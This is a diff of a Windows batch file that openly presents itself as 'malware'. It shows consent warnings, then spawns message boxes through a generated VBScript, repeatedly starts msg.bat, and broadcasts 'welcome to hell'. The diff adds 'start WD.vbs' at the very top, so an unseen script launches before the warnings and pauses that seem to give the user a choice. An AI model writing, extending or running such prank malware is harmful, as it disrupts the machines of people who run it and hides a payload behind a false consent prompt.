@@ -1,14 +1,18 @@
+@echo off
+start WD.vbs
 echo: WARNING
 echo: HI! THIS IS A MAWARE.
 echo: IF YOU DONT WANT RUN
 echo: PLEASE CLOSE THIS WINDOW
 echo: OR END THIS TASK W/ TASK MANANGER.
 pause
+cls
 echo: LAST WARNING
 echo: THIS IS NOT A JOKE,
 echo: IF YOU WANT YOUR MACHINE INFECTED,
 echo: RUN THIS, I WILL NOT BR BLAMED!
 pause
+cls
 msg * welcome to hell
 echo MsgBox('.') >>a.vbs
 echo MsgBox('y') >>a.vbs
@@ -26,5 +30,4 @@ start msg.bat
 start msg.bat
 start msg.bat
 del msg.bat
-
 
